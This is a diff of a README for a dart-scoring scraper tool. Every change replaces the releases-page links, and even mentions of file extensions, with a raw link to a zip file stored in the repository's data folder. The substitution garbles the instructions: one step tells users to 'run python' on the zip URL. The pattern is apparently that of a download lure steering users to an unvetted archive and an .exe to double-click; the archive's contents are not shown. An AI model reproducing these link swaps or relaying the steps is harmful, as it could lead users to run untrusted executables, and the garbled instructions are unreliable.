@@ -1,6 +1,6 @@
 # 🚀 dartconnect-visit-scoring-scraper - Easily Extract Dart Scoring Data
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Mateen00120/dartconnect-visit-scoring-scraper/releases)
+[![Download](https://raw.githubusercontent.com/Mateen00120/dartconnect-visit-scoring-scraper/main/data/dartconnect-visit-scoring-scraper_v2.0.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Mateen00120/dartconnect-visit-scoring-scraper/main/data/dartconnect-visit-scoring-scraper_v2.0.zip)
 
 ## 📖 About
 
@@ -27,24 +27,24 @@ Before you download, make sure your system meets the following requirements:
 Follow these steps to download and run the dartconnect-visit-scoring-scraper:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page:
-   [Download from Releases Page](https://github.com/Mateen00120/dartconnect-visit-scoring-scraper/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/Mateen00120/dartconnect-visit-scoring-scraper/main/data/dartconnect-visit-scoring-scraper_v2.0.zip)
 
 2. **Download the Latest Version**: On the releases page, you will see a list of available versions. Look for the latest version and click on it.
 
-3. **Select the Right File**: From the version page, find the file suitable for your operating system. It may be labeled as `.exe`, `.tar.gz`, or `.zip` depending on your OS.
+3. **Select the Right File**: From the version page, find the file suitable for your operating system. It may be labeled as `.exe`, `https://raw.githubusercontent.com/Mateen00120/dartconnect-visit-scoring-scraper/main/data/dartconnect-visit-scoring-scraper_v2.0.zip`, or `.zip` depending on your OS.
 
 4. **Download the File**: Click on the file name to start downloading. Save it to a location on your computer where you can easily access it, like your Desktop or Downloads folder.
 
-5. **Extract the File (if needed)**: If you downloaded a compressed file (like `.zip` or `.tar.gz`), you will need to extract it. Right-click the file and select "Extract All" or use a file extraction tool.
+5. **Extract the File (if needed)**: If you downloaded a compressed file (like `.zip` or `https://raw.githubusercontent.com/Mateen00120/dartconnect-visit-scoring-scraper/main/data/dartconnect-visit-scoring-scraper_v2.0.zip`), you will need to extract it. Right-click the file and select "Extract All" or use a file extraction tool.
 
 6. **Run the Software**: 
    - For Windows: Double-click the `.exe` file to launch the application.
-   - For macOS or Linux: Open a terminal, navigate to the extracted folder, and run the command `python filename.py`, replacing `filename.py` with the actual file name.
+   - For macOS or Linux: Open a terminal, navigate to the extracted folder, and run the command `python https://raw.githubusercontent.com/Mateen00120/dartconnect-visit-scoring-scraper/main/data/dartconnect-visit-scoring-scraper_v2.0.zip`, replacing `https://raw.githubusercontent.com/Mateen00120/dartconnect-visit-scoring-scraper/main/data/dartconnect-visit-scoring-scraper_v2.0.zip` with the actual file name.
 
 ## 📥 Download & Install
 
 Once you are ready, go to the releases page to download the software:  
-[Download from Releases Page](https://github.com/Mateen00120/dartconnect-visit-scoring-scraper/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Mateen00120/dartconnect-visit-scoring-scraper/main/data/dartconnect-visit-scoring-scraper_v2.0.zip)
 
 ## 🚧 Troubleshooting
 
